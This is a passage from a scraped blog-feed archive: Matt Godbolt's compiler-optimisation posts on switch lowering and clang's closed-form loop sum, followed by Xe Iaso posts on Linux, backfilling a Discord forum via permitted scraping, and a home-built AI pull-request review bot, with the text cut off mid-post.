<code>x</code> and the return value, and rewritten the code as: <code>if (x &lt; 5) return (x+1) * 100; else return 0;</code> - pretty neat. No jump table, just maths!</p>\\n\\n<p>If we mix up the code a bit so there\\'s no obvious relationship between the input and the return value:</p>\\n\\n<p>Still no jump table: Now the compiler has built a bespoke lookup table (<code>CSWTCH.1</code>) and then uses <code>x</code> to index into it (after checking it\\'s in bounds).</p>\\n\\n<p>For \"dense\" case statements, like the ones above, the compiler can be smart. But even with relatively sparse inputs, the compiler can work its magic. Consider this \"is it whitespace?\" routine<sup>1</sup>:</p>\\n\\n<p>That still avoids any kind of jump table; and in fact even avoids a branch:</p>\\n\\n<pre><code>is_whitespace(char):\\n  sub edi, 9            ; edi = x - 9 (<code>\\\\t</code>)\\n  mov eax, 8388631      ; eax = 0b100000000000000000010111\\n  bt rax, rdi           ; test bit edi in the eax bitmask\\n  setc al               ; al = (bit was set) ? 1 : 0\\n  xor edx, edx          ; edx = 0\\n  cmp dil, 24           ; compare edi with 24\\n  cmovnb eax, edx       ; replace al with edx (0) if not below\\n  ret                   ; return\\n</code></pre>\\n\\n\\n<p>The compiler has built a bitmask where each bit says \"should we consider this character to be whitespace\". To fit the range of bits needed to cover all the whitespace characters, the compiler indexes into the bitmask with <code>(x - 9)</code>. The bit test instruction (<code>bt</code>) will test any bit position, but our 32-bit bitmask only has meaningful data in positions 0-31. The compiler checks that <code>(x - 9) &lt;= 24</code> to ensure we\\'re within the valid range <sup>2</sup> of the bitmask (covering tab at position 0 through space at position 23), and replaces the result with 0 for anything outside this range.</p>\\n\\n<p>Just to see what else the compiler can generate, let\\'s take a look at both a dense and sparse example that the compiler can\\'t replace with a table (you\\'ll need to scroll around in the Compiler Explorer panes to see more):</p>\\n\\n<p>For the dense case, the compiler does make a jump table, and indexes by <code>x</code> to jump to the right <code>func</code> routine<sup>3</sup>. For the sparse case, the compiler has to fall back to essentially a set of <code>if()</code> statements, comparing and branching. However, it\\'s clever enough to compare a \"mid-range\" value first (<code>2511</code>), and if the <code>x</code> value is greater, jumps to code that only looks at the <code>5284</code> and <code>4865</code>. So it\\'s essentially a binary serarch tree of comparisons.</p>\\n\\n<p>Different compilers employ quite different tricks, so take some time to see what clang does for all the above examples.</p>\\n\\n<p>Write clear switch statements; let the compiler decide whether that means multiplication, bitmasks, or jump tables. It\\'s pretty darned good at it!</p>\\n\\n<p>See the video that accompanies this post.</p>\\n\\n\\n\\n<p>This post is day 23 of Advent of Compiler Optimisations 2025,\\na 25-day series exploring how compilers transform our code.</p>\\n\\n<p>\u2190 Clever memory tricks | When compilers surprise you \u2192</p>\\n\\n<p>This post was written by a human (Matt Godbolt) and reviewed and proof-read by LLMs and humans.</p>\\n\\n<p>Support Compiler Explorer on Patreon\\nor GitHub,\\nor by buying CE products in the Compiler Explorer Shop.</p>\\n\\n\\n\\n<ol>\\n<li>\\n<p>Of course you should use <code>isspace()</code>.\\xa0\u21a9</p>\\n</li>\\n<li>\\n<p>The <code>bt</code> instruction uses the bit position modulo the operand size. In this particular case the compiler emits a <code>bt rax, rdi</code> so values of (x-9) greater than 64 would potentially map onto some of the set bits.\\xa0\u21a9</p>\\n</li>\\n<li>\\n<p>If you comment out the <code>case 4</code>, at least for GCC, you\\'ll see the compiler goes back to compare-and-branch.\\xa0\u21a9</p>\\n</li>\\n</ol>\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"xania.org/Thank%20you/","title":"Thank you","text":"<p>\u6765\u6e90: xania.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://xania.org/202512/25-thank-you?utm_source=feed&amp;utm_medium=rss</p> <p>{'type': 'application/xhtml+xml', 'language': 'en-GB', 'base': 'https://xania.org/feed', 'value': '<p>Written by me, proof-read by an LLM.\\nDetails at end.</p>\\n\\n<p>It\\'s the 25th! Whatever you celebrate this time of year, I wish you the very best and hope you are having a lovely day. For me, this is a family time: I\\'m not at all religious but was brought up to celebrate Christmas. So, today we\\'ll be cooking a massive roast dinner and enjoying family time<sup>1</sup>.</p>\\n\\n<p>This series was an idea I had around this time last year, and it has been a substantial amount of work. I\\'ve really enjoyed writing it, and seeing the impact it has had on the compiled language community. I realise now in retrospect I exclusively used C and C++<sup>2</sup>, and concentrated on x86 a bit too much. If I do this again, I\\'ll try and widen my horizons!</p>\\n\\n<p>Speaking of doing it again, I have a number of half-researched, half-written ideas that didn\\'t make the cut. I may either write a few more non-advent posts exploring them, or keep them for another year. Right now I can\\'t promise anything: most of the work for this series was done while I was between jobs, and now I am working full time I don\\'t know if I\\'ll be able to do this again. Despite the low-budget look of the videos, and the shortness of the posts, it has been a pretty phenomenal amount of work. I don\\'t know how regular content creators do it! I may post a follow-up on \"the making of AoCO\", and go into some details of how I approached this series.</p>\\n\\n<p>I\\'d like to thank a number of people:</p>\\n\\n<ul>\\n<li>Jason Turner for some ideas, feedback and for being such a proponent of Compiler Explorer over the years.</li>\\n<li>Malcolm Rowe for his review and encouragement.</li>\\n<li>Laurie Kirk for her help and detailed instructions on getting a decent video setup and editing workflow.</li>\\n<li>Sean Riley for invaluable video editing tutoring.</li>\\n<li>Colin Hoad whose \"Advent of Beeb\" videos were the inspiration for this series.</li>\\n<li>All the folks who work on compilers: GCC, clang, MSVC and the many others. I really only dug into GCC and clang, but without the hard work of compiler maintainers, this series wouldn\\'t exist.</li>\\n<li>All of Compiler Explorer\\'s Patrons (join them here), GitHub sponsors (join them here), and in particular Greg Barker for his ideas.</li>\\n<li>The Compiler Explorer Team - a group of lovely people who very kindly give up their time to help administrate the site, triage and fix bugs, and add new features. Without them, Compiler Explorer wouldn\\'t be a tenth of the site it is now.</li>\\n<li>And of course, my wonderful wife, Ness, for her support over the last few months as I routinely ignored her to write articles and record and edit videos. Thank you - I love you so very much.</li>\\n</ul>\\n\\n<p>And of course, thank you for joining me on this journey. Compilers are amazing: truly one of the quiet modern miracles that makes the modern world possible!</p>\\n\\n<p>See the video that accompanies this post.</p>\\n\\n\\n\\n<p>This post is day 25 of Advent of Compiler Optimisations 2025,\\na 25-day series exploring how compilers transform our code.</p>\\n\\n<p>\u2190 When compilers surprise you</p>\\n\\n<p>This post was written by a human (Matt Godbolt) and reviewed and proof-read by LLMs and humans.</p>\\n\\n<p>Support Compiler Explorer on Patreon\\nor GitHub,\\nor by buying CE products in the Compiler Explorer Shop.</p>\\n\\n\\n\\n<ol>\\n<li>\\n<p>As much as our teenage children will tolerate, anyway.\\xa0\u21a9</p>\\n</li>\\n<li>\\n<p>In my notes I had at least a couple of Rust ideas, but never got around to them.\\xa0\u21a9</p>\\n</li>\\n</ol>\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"xania.org/When%20compilers%20surprise%20you/","title":"When compilers surprise you","text":"<p>\u6765\u6e90: xania.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://xania.org/202512/24-cunning-clang?utm_source=feed&amp;utm_medium=rss</p> <p>{'type': 'application/xhtml+xml', 'language': 'en-GB', 'base': 'https://xania.org/feed', 'value': '<p>Written by me, proof-read by an LLM.\\nDetails at end.</p>\\n\\n<p>Every now and then a compiler will surprise me with a really smart trick. When I first saw this optimisation I could hardly believe it. I was looking at loop optimisation, and wrote something like this simple function that sums all the numbers up to a given value:</p>\\n\\n<p>So far so decent: GCC has done some preliminary checks, then fallen into a loop that efficiently sums numbers using <code>lea</code> (we\\'ve seen this before). But taking a closer look at the loop we see something unusual:</p>\\n\\n<pre><code>.L3:\\n  lea edx, [rdx+1+rax2]        ; result = result + 1 + x2\\n  add eax, 2                    ; x += 2\\n  cmp edi, eax                  ; x != value\\n  jne .L3                       ; keep looping\\n\\n\\n\\n<p>The compiler has cleverly realised it can do two numbers<sup>1</sup> at a time using the fact it can see we\\'re going to add <code>x</code> and <code>x + 1</code>, which is the same as adding <code>x*2 + 1</code>. Very cunning, I think you\\'ll agree!</p>\\n\\n<p>If you turn the optimiser up to <code>-O3</code> you\\'ll see the compiler works even harder to vectorise the loop using parallel adds. All very clever.</p>\\n\\n<p>This is all for GCC. Let\\'s see what clang does with our code:</p>\\n\\n<p>This is where I nearly fell off my chair: there is no loop! Clang checks for positive <code>value</code>, and if so it does:</p>\\n\\n<pre><code>  lea eax, [rdi - 1]        ; eax = value - 1\\n  lea ecx, [rdi - 2]        ; ecx = value - 2\\n  imul rcx, rax             ; rcx = (value - 1) * (value - 2)\\n  shr rcx                   ; rcx &gt;&gt;= 1\\n  lea eax, [rdi + rcx]      ; eax = value + rcx\\n  dec eax                   ; --eax\\n  ret\\n</code></pre>\\n\\n\\n<p>It was not at all obvious to me what on earth was going on here. By backing out the maths a little, this is equivalent to:</p>\\n\\n<pre><code>v + ((v - 1)(v - 2) / 2) - 1;\\n</code></pre>\\n\\n\\n<p>Expanding the parentheses:</p>\\n\\n<pre><code>v + (v\u00b2 - 2v - v + 2) / 2 - 1\\n</code></pre>\\n\\n\\n<p>Rearranging a bit:</p>\\n\\n<pre><code>(v\u00b2 - 3v + 2) / 2 + (v - 1)\\n</code></pre>\\n\\n\\n<p>Multiplying the <code>(v - 1)</code> by 2 / 2:</p>\\n\\n<pre><code>(v\u00b2 - 3v + 2) / 2 + (2v - 2)/2\\n</code></pre>\\n\\n\\n<p>Combining those and cancelling:</p>\\n\\n<pre><code>(v\u00b2 - v) / 2\\n</code></pre>\\n\\n\\n<p>Simplifying and factoring gives us <code>v(v - 1) / 2</code> which is the closed-form solution to the \"sum of integers\"! Truly amazing<sup>2</sup> - we\\'ve gone from an O(n) algorithm as written, to an O(1) one!</p>\\n\\n<p>I love that despite working with compilers for more than twenty years, they can still surprise and delight me. The years of experience and work that have been poured into making compilers great is truly humbling, and inspiring.</p>\\n\\n<p>We\\'re nearly at the end of this series - there\\'s so much more to say but that will have to wait for another time. Tomorrow will be a little different: see you then!</p>\\n\\n<p>See the video that accompanies this post.</p>\\n\\n\\n\\n<p>This post is day 24 of Advent of Compiler Optimisations 2025,\\na 25-day series exploring how compilers transform our code.</p>\\n\\n<p>\u2190 Switching it up a bit | Thank you \u2192</p>\\n\\n<p>This post was written by a human (Matt Godbolt) and reviewed and proof-read by LLMs and humans.</p>\\n\\n<p>Support Compiler Explorer on Patreon\\nor GitHub,\\nor by buying CE products in the Compiler Explorer Shop.</p>\\n\\n\\n\\n<ol>\\n<li>\\n<p>Some of the initial code checks for odd/even and accounts accordingly.\\xa0\u21a9</p>\\n</li>\\n<li>\\n<p>Why does the compiler emit this exact sequence and not a slightly more straightforward sequence? I think it\\'s partly avoiding overflow in cases where it might otherwise overflow and just a side effect of the way clang tracks and infers induction variables. I really don\\'t know for sure, though.\\xa0\u21a9</p>\\n</li>\\n</ol>\\n'}\n\n<p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"xeiaso.net/","title":"xeiaso.net","text":"<p>Thoughts and musings from Xe Iaso</p> <p>\u7f51\u7ad9: https://xeiaso.net RSS: https://xeiaso.net/blog.rss</p>"},{"location":"xeiaso.net/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Did Zendesk get popped-_20260205</li> <li>Backfilling Discord forum channels with the power of terrible code_20260205</li> <li>Tormentmaxxing 'simple requests'_20260205</li> <li>I made a simple agent for PR reviews. Don't use it_20260205</li> <li>2026 will be my year of the Linux desktop_20260205</li> </ul>"},{"location":"xeiaso.net/2026%20will%20be%20my%20year%20of%20the%20Linux%20desktop_20260205/","title":"2026 will be my year of the Linux desktop","text":"<p>\u6765\u6e90: https://xeiaso.net \u94fe\u63a5: https://xeiaso.net/notes/2026/year-linux-desktop/ \u65e5\u671f: Fri, 02 Jan 2026 00:00:00 GMT</p> <p>TL;DR: 2026 is going to be The Year of The Linux Desktop for me. I haven't booted into Windows in over 3 months on my tower and I'm starting to realize that it's not worth wasting the space for. I plan to unify my three SSDs and turn them all into btrfs drives on Fedora.</p> <p>I've been merely tolerating Windows 11 for a while but recently it's gotten to the point where it's just absolutely intolerable. Somehow Linux on the desktop has gotten so much better by not even doing anything differently. Microsoft has managed to actively sabotage the desktop experience through years of active disregard and spite against their users. They've managed to take some of their most revolutionary technological innovations (the NT kernel's hybrid design allowing it to restart drivers, NTFS, ReFS, WSL, Hyper-V, etc.) then just shat all over them with start menus made with React Native, control-alt-delete menus that are actually just webviews, and forcing Copilot down everyone's throats to the point that I've accidentally gotten stuck in Copilot in a handheld gaming PC and had to hard reboot the device to get out of it. It's as if the internal teams at Microsoft have had decades of lead time in shooting each other in the head with predictable results.</p> <p>To be honest, I've had enough. I'm going to go with Fedora on my tower and Bazzite (or SteamOS) on my handhelds.</p> <p>I think that Linux on the desktop is ready for the masses now, not because it's advanced in a huge leap/bound. It's ready for the masses to use because Windows has gotten so much actively worse that continuing to use it is an active detriment to user experience and stability. Not to mention with the price of ram lately, you need every gigabyte you can get and desktop Linux lets you waste less of it on superfluous bullshit that very few people actually want.</p> <p></p> <p>Cadey</p> <p>Oh, and if I want a large language model integrated into my tower, I'm going to write the integration myself with the model running on hardware I can look at.</p> <p>At the very least, when something goes wrong on Linux you have log messages that can let you know what went wrong so you can search for it.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/","title":"Backfilling Discord forum channels with the power of terrible code","text":"<p>\u6765\u6e90: https://xeiaso.net \u94fe\u63a5: https://www.tigrisdata.com/blog/discord-backfill/ \u65e5\u671f: Tue, 27 Jan 2026 00:00:00 GMT</p> <p>Hey all! We've got a Discord so you can chat with us about the wild world of object storage and get any help you need. We've also set up Answer Overflow so that you can browse the Q&amp;A from the web.</p> <p>Today I'm going to discuss how we got there and solved one of the biggest problems with setting up a new community or forum: backfilling existing Q&amp;A data so that the forum doesn't look sad and empty.</p> <p>All the code I wrote to do this is open source in our glue repo. The rest of this post is a dramatic retelling of the thought process and tradeoffs that were made as a part of implementing, testing, and deploying this pull request.</p> <p>Ready? Let's begin!</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#thinking-about-this-from-an-ai-big-datatm-perspective","title":"Thinking about this from an AI Big Data\u2122 perspective","text":"<p>There's a bunch of ways you can think about this problem, but given the current hype zeitgeist and contractual obligations we can frame this as a dataset management problem. Effectively we have a bunch of forum question/answer threads on another site, and we want to migrate the data over to a new home on Discord. This is the standard \"square peg to round hole\" problem you get with Extract, Transform, Load (ETL) pipelines and AI dataset management (mostly taking your raw data and tokenizing it so that AI models work properly).</p> <p>So let's think about this from an AI dataset perspective. Our pipeline has three distinct steps:</p> <ul> <li>Extracting the raw data from the upstream source and caching it in Tigris.</li> <li>Transforming the cached data to make it easier to consume in Discord, storing that in Tigris again.</li> <li>Loading the transformed data into Discord so that people can see the threads in app and on the web with Answer Overflow.</li> </ul> <p>When thinking about gathering and transforming datasets, it's helpful to start by thinking about the modality of the data you're working with. Our dataset is mostly forum posts, which is structured text. One part of the structure contains HTML rendered by the forum engine. This, the \"does this solve my question\" flag, and the user ID of the person that posted the reply are the things we care the most about.</p> <p>I made a bucket for this (in typical recovering former SRE fashion it's named for a completely different project) with snapshots enabled, and then got cracking. Tigris snapshots will let me recover prior state in case I don't like my transformations.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#gathering-the-dataset","title":"Gathering the dataset","text":"<p>When you are gathering data from one source in particular, one of the first things you need to do is ask permission from the administrator of that service. You don't know if your scraping could cause unexpected load leading to an outage. It's a classic tragedy of the commons problem that I have a lot of personal experience in preventing. When you reach out, let the administrators know the data you want to scrape and the expected load\u2013 a lot of the time, they can give you a data dump, and you don't even need to write your scraper. We got approval for this project, so we're good to go!</p> <p>To get a head start, I adapted an old package of mine to assemble User-Agent strings in such a way that gives administrators information about who is requesting data from their servers along with contact information in case something goes awry. Here's an example User-Agent string:</p> <pre><code>tigris-gtm-glue (go1.25.5/darwin/arm64; https://tigrisdata.com; +qna-importer) Hostname/hoshimi-miyabi.local\n</code></pre> <p>This gives administrators the following information:</p> <ul> <li>The name of the project associated with the requests (tigris-gtm-glue, where gtm means \"go-to-market\", which is the current in-vogue buzzword translation for whatever it is we do).</li> <li>The Go version, computer OS, and CPU architecture of the machine the program is running on so that administrator complaints can be easier isolated to individual machines.</li> <li>A contact URL for the workload, in our case it's just the Tigris home page.</li> <li>The name of the program doing the scraping so that we can isolate root causes down even further. Specifically it's the last path element of <code>os.Args[0]</code>, which contains the path the kernel was passed to the executable.</li> <li>The hostname where the workload is being run in so that we can isolate down to an exact machine or Kubernetes pod. In my case it's the hostname of my work laptop.</li> </ul> <p>This seems like a lot of information, but realistically it's not much more than the average Firefox install attaches to each request:</p> <pre><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0\n</code></pre> <p>The main difference is adding the workload hostname purely to help debugging a misbehaving workload. This is a concession that makes each workload less anonymous, however keep in mind that when you are actively scraping data you are being seen as a foreign influence. Conceding more data than you need to is just being nice at that point.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#if-youre-given-the-whole-webapp-you-use-the-whole-webapp","title":"If you're given the whole webapp, you use the whole webapp","text":"<p>One of the other \"good internet citizen\" things to do when doing benign scraping is try to reduce the amount of load you cause to the target server. In my case the forum engine is a Rails app (Discourse), which means there's a few properties of Rails that work to my advantage.</p> <p>Fun fact about Rails: if you append <code>.json</code> to the end of a URL, you typically get a JSON response based on the inputs to the view. For example, consider my profile on Lobsters at https://lobste.rs/~cadey. If you instead head to https://lobste.rs/~cadey.json, you get a JSON view of my profile information. This means that a lot of the process involved gathering a list of URLs with the thread indices we wanted, then constructing the thread URLs with <code>.json</code> slapped on the end to get machine-friendly JSON back.</p> <p>This made my life so much easier.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#shoving-it-in-tigris","title":"Shoving it in Tigris","text":"<p>Now that we have easy ways to get the data from the forum engine, the next step is to copy it out to Tigris directly after ingesting it. In order to do that I reused some code I made ages ago as a generic data storage layer kinda like Keyv in the node ecosystem. One of the storage backends was a generic object storage backend. I plugged Tigris into it and it worked on the first try. Good enough for me!</p> <p>Either way: this is the interface I used:</p> <pre><code>// Interface defines the calls used for storage in a local or remote datastore.\n        // This can be implemented with an in-memory, on-disk, or in-database storage\n        // backend.\n        type Interface interface {\n            // Delete removes a value from the store by key.\n            Delete(ctx context.Context, key string) error\n\n            // Exists returns nil if the key exists, ErrNotFound if it does not exist.\n            Exists(ctx context.Context, key string) error\n\n            // Get returns the value of a key assuming that value exists and has not expired.\n            Get(ctx context.Context, key string) ([]byte, error)\n\n            // Set puts a value into the store that expires according to its expiry.\n            Set(ctx context.Context, key string, value []byte) error\n\n            // List lists the keys in this keyspace optionally matching by a prefix.\n            List(ctx context.Context, prefix string) ([]string, error)\n        }\n</code></pre> <p>By itself this isn't the most useful, however the real magic comes with my <code>JSON[T]</code> adaptor type. This uses Go generics to do type-safe operations on Tigris such that you have 90% of what you need for a database replacement. When you do any operations on a <code>JSON[T]</code> adaptor, the following happens:</p> <ul> <li>Key names get prefixed automatically.</li> <li>All data is encoded into JSON on write and decoded from JSON on read using the Go standard library.</li> <li>Type safety at the compiler level means the only way you can corrupt data is by having different \"tables\" share the same key prefix. Try not to do that! You can use Tigris bucket snapshots to help mitigate this risk in the worst case.</li> </ul> <p>In the future I hope to extend this to include native facilities for forking, snapshots, and other nice to haves like an in-memory cache to avoid IOPs pressure, but for now this is fine.</p> <p>As the data was being read from the forum engine, it was saved into Tigris. All future lookups to that data I scraped happened from Tigris, meaning that the upstream server only had to serve the data I needed once instead of having to constantly re-load and re-reference it like the latest batch of abusive scrapers seem to do.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#massaging-the-data","title":"Massaging the data","text":"<p>So now I have all the data, I need to do some massaging to comply both with Discord's standards and with some arbitrary limitations we set on ourselves:</p> <ol> <li>Discord needs Markdown, the forum engine posts are all HTML.</li> <li>We want to remove personally-identifiable information from those posts just to keep things a bit more anonymous.</li> <li>Discord has a limit of 2048 characters per message and some posts will need to be summarized to fit within that window.</li> </ol> <p>In general, this means I needed to take the raw data from the forum engine and streamline it down to this Go type:</p> <pre><code>type DiscourseQuestion struct {\n            Title string          `json:\"title\"`\n            Slug  string          `json:\"slug\"`\n            Posts []DiscoursePost `json:\"posts\"`\n        }\n\n        type DiscoursePost struct {\n            Body     string `json:\"body\"`\n            UserID   string `json:\"userID\"`\n            Accepted bool   `json:\"accepted\"`\n        }\n</code></pre> <p>In order to make this happen, I ended up using a simple AI agent to do the cleanup. It was prompted to do the following:</p> <ul> <li>Convert HTML to Markdown : Okay, I could have gotten away using a dedicated library for this like html2text, but I didn't think about that at the time.</li> <li>Remove mentions and names : Just strip them out or replace the mentions with generic placeholders (\"someone I know\", \"a friend\", \"a colleague\", etc.).</li> <li>Keep \"useful\" links: This was left intentionally vague and random sampling showed that it was good enough.</li> <li>Summarize long text : If the text is over 1000 characters, summarize it to less than 1000 characters.</li> </ul> <p>I figured this should be good enough so I sent it to my local DGX Spark running GPT-OSS 120b via llama.cpp and manually looked at the output for a few randomly selected threads. The sample was legit, which is good enough for me.</p> <p>Once that was done I figured it would be better to switch from the locally hosted model to a model in a roughly equivalent weight class (gpt-5-mini). I assumed that the cloud model would be faster and slightly better in terms of its output. This test failed because I have somehow managed to write code that works great with llama.cpp on the Spark but results in errors using OpenAI's production models.</p> <p>I didn't totally understand what went wrong, but I didn't dig too deep because I knew that the local model would probably work well enough. It ended up taking about 10 minutes to chew through all the data, which was way better than I expected and continues to reaffirm my theory that GPT-OSS 120b is a good enough generic workhorse model, even if it's not the best at coding.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#avoiding-everything-being-a-generic-pile-of-meh","title":"Avoiding everything being a generic pile of meh","text":"<p>From here things worked, I was able to ingest things and made a test Discord to try things out without potentially getting things indexed. I had my tool test-migrate a thread to the test Discord and got a working result.</p> <p>To be fair, this worked way better than expected (I added random name generation and as a result our CEO Ovais, became Mr. Quinn Price for that test), but it felt like one thing was missing: avatars. Having everyone in the migrated posts use the generic \"no avatar set\" avatar certainly would work, but I feel like it would look lazy. Then I remembered that I also have an image generation model running on the Spark: Z-Image Turbo. Just to try it out, I adapted a hacky bit of code I originally wrote on stream while I was learning to use voice coding tools to generate per-user avatars based on the internal user ID.</p> <p>This worked way better than I expected when I tested how it would look with each avatar attached to their own users.</p> <p>In order to serve the images, I stored them in the same Tigris bucket, but set ACLs on each object so that they were public, meaning that the private data stayed private, but anyone can view the objects that were explicitly marked public when they were added to Tigris. This let me mix and match the data so that I only had one bucket to worry about. This reduced a lot of cognitive load and I highly suggest that you repeat this pattern should you need this exact adaptor between this exact square peg and round hole combination.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#making-the-forum-threads-look-like-threads","title":"Making the forum threads look like threads","text":"<p>Now that everything was working in development, it was time to see how things would break in production! In order to give the fa\u00e7ade that every post was made by a separate user, I used a trick that my friend who wrote Pluralkit (an accessibility tool for a certain kind of neurodivergence) uses: using Discord webhooks to introduce multiple pseudo-users into one channel.</p> <p>I had never combined forum channels with webhook pseudo-users like this before, but it turned out to be way easier than expected. All I had to do was add the right <code>thread_name</code> parameter when creating a new thread and the <code>thread_id</code> parameter when appending a new message to it. It was really neat and made it pretty easy to associate each thread ingressed from Discourse into its own Discord thread.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#the-big-import","title":"The big import","text":"<p>Then all that was left was to run the Big Scary Command\u2122 and see what broke. A couple messages were too long (which was easy to fix by simply manually rewriting them, doing the right state layer brain surgery, deleting things on Discord, and re-running the migration tool. However 99.9% of messages were correctly imported on the first try.</p> <p>I had to double check a few times including the bog-standard wakefulness tests. If you've never gone deep into lucid dreaming before, a wakefulness test is where you do something obviously impossible to confirm that it does not happen, such as trying to put your fingers through your palm. My fingers did not go through my palm. After having someone else confirm that I wasn't hallucinating more than usual I found out that my code did in fact work and as a result you can now search through the archives on community.tigrisdata.com or via the MCP server!</p> <p>I consider that a massive success.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#conclusion-making-useful-forums","title":"Conclusion: making useful forums","text":"<p>As someone who has seen many truly helpful answers get forgotten in the endless scroll of chats, I wanted to build a way to get that help in front of users when they need it by making it searchable outside of Discord. Finding AnswerOverflow was pure luck: I happened to know someone who uses it for the support Discord for the Linux distribution I use on my ROG Ally, Bazzite. Thanks, j0rge!</p> <p>AnswerOverflow also has an MCP server so that your agents can hook into our knowledge base to get the best answers. To find out more about setting it up, take a look at the \"MCP Server\" button on the Tigris Community page. They've got instructions for most MCP clients on the market. Worst case, configure your client to access this URL:</p> <pre><code>https://community.tigrisdata.com/mcp\n</code></pre> <p>And bam, your agent has access to the wisdom of the ancients.</p> <p>But none of this is helpful without the actual answers. We were lucky enough to have existing Q&amp;A in another forum to leverage. If you don't have the luxury, you can write your own FAQs and scenarios as a start. All I can say is, thank you to the folks who asked and answered these questions\u2013 we're happy to help, and know that you're helping other users by sharing.</p>"},{"location":"xeiaso.net/Backfilling%20Discord%20forum%20channels%20with%20the%20power%20of%20terrible%20code_20260205/#join-our-discord-community","title":"Join our Discord community","text":"<p>Connect with other developers, get help, and share your projects. Search our Q&amp;A archives or ask a new question. Join the Discord.</p>"},{"location":"xeiaso.net/Did%20Zendesk%20get%20popped-_20260205/","title":"Did Zendesk get popped?","text":"<p>\u6765\u6e90: https://xeiaso.net \u94fe\u63a5: https://xeiaso.net/notes/2026/zendesk-popped/ \u65e5\u671f: Wed, 04 Feb 2026 00:00:00 GMT</p> <p>I don't know how to properly raise this, but I've gotten at least 100 emails from various Zendesk customers (no discernible pattern, everything from Soundcloud to GitLab Support to the Furbo Pet Camera).</p> <p>Is Zendesk being hacked?</p> <p>I'll update the post with more information as it is revealed.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/","title":"I made a simple agent for PR reviews. Don't use it.","text":"<p>\u6765\u6e90: https://xeiaso.net \u94fe\u63a5: https://xeiaso.net/blog/2026/reviewbot/ \u65e5\u671f: Sun, 11 Jan 2026 00:00:00 GMT</p> <p>My coworkers really like AI-powered code review tools and it seems that every time I make a pull request in one of their repos I learn about yet another AI code review SaaS product. Given that there are so many of them, I decided to see how easy it would be to develop my own AI-powered code review bot that targets GitHub repositories. I managed to hack out the core of it in a single afternoon using a model that runs on my desk. I've ended up with a little tool I call reviewbot that takes GitHub pull request information and submits code reviews in response.</p> <p>reviewbot is powered by a DGX Spark, llama.cpp, and OpenAI's GPT-OSS 120b. The AI model runs on my desk with a machine that pulls less power doing AI inference than my gaming tower pulls running fairly lightweight 3D games. In testing I've found that nearly all runs of reviewbot take less than two minutes, even at a rate of only 60 tokens per second generated by the DGX Spark.</p> <p>reviewbot is about 350 lines of Go that just feeds pull request information into the context window of the model and provides a few tools for actions like \"leave pull request review\" and \"read contents of file\". I'm considering adding other actions like \"read messages in thread\" or \"read contents of issue\", but I haven't needed them yet.</p> <p>To make my life easier, I distribute it as a Docker image that gets run in GitHub Actions whenever a pull review comment includes the magic phrase <code>/reviewbot</code>.</p> <p>The main reason I made reviewbot is that I couldn't find anything like it that let you specify the combination of:</p> <ul> <li>Your own AI model name</li> <li>Your own AI model provider URL</li> <li>Your own AI model provider API token</li> </ul> <p>I'm fairly sure that there are thousands of similar AI-powered tools on the market that I can't find because Google is a broken tool, but this one is mine.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#how-it-works","title":"How it works","text":"<p>When reviewbot reviews a pull request, it assembles an AI model prompt like this:</p> <pre><code>Pull request info:\n\n        &lt;pr&gt;\n        &lt;title&gt;Pull request title&lt;/title&gt;\n        &lt;author&gt;GitHub username of pull request author&lt;/author&gt;\n        &lt;body&gt;\n        Text body of the pull request\n        &lt;/body&gt;\n        &lt;/pr&gt;\n\n        Commits:\n\n        &lt;commits&gt;\n        &lt;commit&gt;\n        &lt;author&gt;Xe&lt;/author&gt;\n        &lt;message&gt;\n        chore: minor formatting and cleanup fixes\n\n        - Format .mcp.json with prettier\n        - Minor whitespace cleanup\n\n        Assisted-by: GLM 4.7 via Claude Code\n        Reviewbot-request: yes\n        Signed-off-by: Xe Iaso &lt;me@xeiaso.net&gt;\n        &lt;/message&gt;\n        &lt;/commit&gt;\n        &lt;/commits&gt;\n\n        Files changed:\n\n        &lt;files&gt;\n        &lt;file&gt;\n        &lt;name&gt;.mcp.json&lt;/name&gt;\n        &lt;status&gt;modified&lt;/status&gt;\n        &lt;patch&gt;\n        @@ -3,11 +3,8 @@\n             \"python\": {\n               \"type\": \"stdio\",\n               \"command\": \"go\",\n        -      \"args\": [\n        -        \"run\",\n        -        \"./cmd/python-wasm-mcp\"\n        -      ],\n        +      \"args\": [\"run\", \"./cmd/python-wasm-mcp\"],\n               \"env\": {}\n             }\n           }\n        -}\n        \\ No newline at end of file\n        +}\n        &lt;/patch&gt;\n        &lt;/file&gt;\n        &lt;/files&gt;\n\n        Agent information:\n\n        &lt;agentInfo&gt;\n        [contents of AGENTS.d in the repository]\n        &lt;/agentInfo&gt;\n</code></pre> <p>The AI model can return one of three 